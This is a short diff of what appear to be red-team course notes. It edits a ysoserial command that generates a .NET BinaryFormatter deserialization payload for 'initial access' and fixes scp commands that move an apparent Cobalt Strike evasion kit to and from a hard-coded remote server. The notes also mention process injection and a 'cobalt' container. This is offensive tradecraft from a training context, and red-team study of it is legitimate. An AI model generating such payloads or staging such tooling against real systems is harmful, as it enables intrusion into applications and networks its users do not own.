@@ -1,7 +1,7 @@
 # Initial access
 
 ```
-.\ysoserial.exe -g DataSetOldBehaviourFromFile -f BinaryFormatter -c "ExploitClass.cs;System.dll" -o raw --minify --spoofedAssembly=mscorlib --outputpath=C:\Temp\data.bin
+.\ysoserial.exe -g DataSetOldBehaviourFromFile -f BinaryFormatter -c "ExploitClass.cs;System.dll" -o raw --minify --spoofedAssembly=mscorlib --outputpath=C:\Payloads\data.bin
 ```
 
 Classic process injection
@@ -371,11 +371,11 @@ sudo /usr/bin/docker restart cobalt
 `scp -r C:\Tools\Crystal-Kit\ root@157.90.29.76:/tmp/Crystal-Kit-CRTL`
 
 **Crystal-Kit-CRTL**
-- `scp root@157.90.29.76:/tmp/Crystal-Kit-CRTL/ C:\Tools\`
+- `scp -r root@157.90.29.76:/tmp/Crystal-Kit-CRTL/ C:\Tools\`
 - Load `C:\Tools\Crystal-Kit-CRTL\crystalkit.cna`
 
 **Crystal-Kit-main (GitHub)**
-- `scp root@157.90.29.76:/tmp/Crystal-Kit-main/ C:\Tools\`
+- `scp root@157.90.29.76:/tmp/Crystal-Kit-main.zip C:\Tools\`
 - Load `C:\Tools\Crystal-Kit-main\crystalkit.cna`
 # Feedback score
 
